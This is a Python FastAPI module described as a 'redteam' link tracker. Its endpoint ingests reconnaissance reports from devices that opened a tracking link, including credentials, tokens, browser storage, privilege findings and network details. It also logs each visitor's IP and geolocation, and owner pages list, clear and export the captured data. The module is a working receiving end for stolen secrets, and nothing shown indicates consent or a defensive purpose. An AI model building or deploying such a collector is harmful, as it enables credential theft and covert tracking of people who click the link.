"""app/redteam.py — 踏んだ端末の偵察結果を取り込み、追跡画面で見せる。"""

from __future__ import annotations

import datetime as _dt
import json

from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import HTMLResponse, RedirectResponse, Response

from . import linktrack, persist, tenancy, users
from .tenancy import db

router = APIRouter()
SEV = {"critical": 40, "high": 20, "medium": 8, "low": 3, "info": 1}
READY = False

DDL = """
CREATE TABLE IF NOT EXISTS link_rt (
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, hit_id INTEGER, ts TEXT,
  origin TEXT, referer TEXT, ua TEXT, ip TEXT, fp TEXT, findings TEXT,
  creds TEXT, tokens TEXT, storage TEXT, surface TEXT, priv TEXT, dos TEXT,
  net TEXT, score INTEGER DEFAULT 0, grade TEXT DEFAULT ''
);
CREATE TABLE IF NOT EXISTS rt_links (code TEXT PRIMARY KEY, on INTEGER DEFAULT 1);
CREATE INDEX IF NOT EXISTS idx_rt ON link_rt(code, id);
"""


def _now():
    return _dt.datetime.now(_dt.timezone.utc).isoformat()


def _ensure():
    global READY
    if READY:
        return
    with db.tx() as c:
        c.executescript(DDL)
    READY = True


def _bind(code: str):
    o = users.owner_of_link(code)
    if o:
        tenancy.set_current(o)
    return o


async def auth(request: Request):
    from . import main
    return await main.auth(request)


def _j(v):
    return json.dumps(v if v not in (None, "", [], {}) else None, ensure_ascii=False)[:40000]


@router.post("/l/{code}/rt")
async def rt_ingest(code: str, request: Request):
    if not _bind(code):
        return {"ok": False}
    _ensure()
    try:
        b = await request.json()
    except Exception:
        b = {}
    if not isinstance(b, dict):
        b = {}
    f = [x for x in (b.get("findings") or []) if isinstance(x, dict)]
    score = min(100, sum(SEV.get(x.get("sev", "info"), 1) for x in f))
    grade = ("A" if score < 10 else "B" if score < 25 else "C" if score < 45
             else "D" if score < 70 else "F")
    with db.tx() as c:
        c.execute("INSERT INTO link_rt (code,hit_id,ts,origin,referer,ua,ip,fp,findings,"
                  "creds,tokens,storage,surface,priv,dos,net,score,grade) "
                  "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                  (code, int(b.get("hit_id") or 0), _now(),
                   str(b.get("origin") or "")[:300], str(b.get("referer") or "")[:300],
                   (request.headers.get("user-agent") or "")[:300],
                   linktrack.client_ip(request), _j(b.get("fp")), _j(f),
                   _j(b.get("creds")), _j(b.get("tokens")), _j(b.get("storage")),
                   _j(b.get("surface")), _j(b.get("priv")), _j(b.get("dos")),
                   _j(b.get("net")), score, grade))
    return {"ok": True, "grade": grade}


@router.get("/l/{code}/rt/ip")
def rt_ip(code: str, request: Request):
    if not _bind(code):
        return {"ip": ""}
    ip = linktrack.client_ip(request)
    g = linktrack.geo(ip) or {}
    h = request.headers
    return {"ip": ip, "xff": h.get("x-forwarded-for", ""), "via": h.get("via", ""),
            "org": g.get("org") or "", "asn": g.get("asn") or "",
            "city": g.get("city") or "", "country": g.get("country") or ""}


@router.get("/link/{code}/redteam", response_class=HTMLResponse)
def rt_page(code: str, request: Request, u=Depends(auth)):
    _bind(code)
    _ensure()
    link = db.link_get(code)
    if not link:
        raise HTTPException(404)
    cfg = db.q1("SELECT on FROM rt_links WHERE code=?", (code,))
    rows = []
    for r in db.q("SELECT * FROM link_rt WHERE code=? ORDER BY id DESC LIMIT 200", (code,)):
        d = dict(r)
        for k in ("fp", "findings", "creds", "tokens", "storage", "surface", "priv", "dos", "net"):
            try:
                d[k] = json.loads(d.get(k) or "null")
            except Exception:
                d[k] = None
        rows.append(d)
    from . import main
    return main.render("link_redteam.html", request, link=link,
                       on=bool(cfg and cfg["on"]), rows=rows)


@router.post("/link/{code}/redteam/toggle")
def rt_toggle(code: str, u=Depends(auth)):
    _bind(code)
    _ensure()
    cur = db.q1("SELECT on FROM rt_links WHERE code=?", (code,))
    new = 0 if (cur and cur["on"]) else 1
    with db.tx() as c:
        c.execute("INSERT INTO rt_links(code,on) VALUES(?,?) "
                  "ON CONFLICT(code) DO UPDATE SET on=excluded.on", (code, new))
    persist.push_user(u, force=True)
    return RedirectResponse(f"/link/{code}/redteam", 303)


@router.post("/link/{code}/redteam/clear")
def rt_clear(code: str, u=Depends(auth)):
    _bind(code)
    _ensure()
    with db.tx() as c:
        c.execute("DELETE FROM link_rt WHERE code=?", (code,))
    persist.push_user(u, force=True)
    return RedirectResponse(f"/link/{code}/redteam", 303)


@router.get("/link/{code}/redteam/raw")
def rt_raw(code: str, u=Depends(auth)):
    _bind(code)
    _ensure()
    rows = db.q("SELECT * FROM link_rt WHERE code=? ORDER BY id DESC", (code,))
    return Response("\n".join(json.dumps(dict(r), ensure_ascii=False) for r in rows),
                    media_type="application/jsonl")